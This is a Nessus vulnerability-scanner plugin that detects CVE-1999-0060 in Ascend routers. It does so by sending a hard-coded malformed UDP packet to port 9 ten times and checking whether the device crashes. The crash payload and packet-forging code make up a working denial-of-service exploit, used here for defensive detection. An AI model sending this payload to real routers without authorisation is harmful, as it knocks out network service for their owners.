#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10019);
 script_version("$Revision: 1.30 $");
 script_cvs_date("$Date: 2014/05/25 01:17:39 $");

 script_cve_id("CVE-1999-0060");
 script_bugtraq_id(714);
 script_osvdb_id(1112);

 script_name(english:"Ascend MAX / Pipeline Router Discard Port Malformed Packet DoS");
 script_summary(english:"Crashes an ascend router");

 script_set_attribute(attribute:"synopsis", value:
"The remote router is susceptible to a remote denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote Ascend router reboot by sending it
a UDP packet containg special data on port 9 (discard).

An attacker may use this flaw to make your router crash continuously,
preventing your network from working properly.");
 script_set_attribute(attribute:"solution", value:"Upgrade to the latest router firmware.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1998/03/16");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);

 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");

 script_family(english:"Denial of Service");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);
if ( TARGET_IS_IPV6 ) exit(0);

start_denial();

crash = raw_string(0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4,
    0x81, 0x00, 0x00, 0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41,
    0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50,
    0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57,
    0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53);

port = 9;
ip = forge_ip_packet(ip_hl: 5,	 	ip_v : 4,	ip_tos : 123,
		     ip_len : 80, 	ip_id:1234,	ip_off : 0,
		     ip_ttl : 0xff,	ip_p:IPPROTO_UDP,
		     ip_src : this_host());
udp = forge_udp_packet(ip:ip,
			uh_sport : 9,
			uh_dport : 9,
			uh_ulen  : 60,
			data:crash);

send_packet(udp, pcap_active:FALSE) x 10;
sleep(5);
alive = end_denial();
if(!alive){
  		security_warning(port:port, protocol:"udp");
		set_kb_item(name:"Host/dead", value:TRUE);
		}

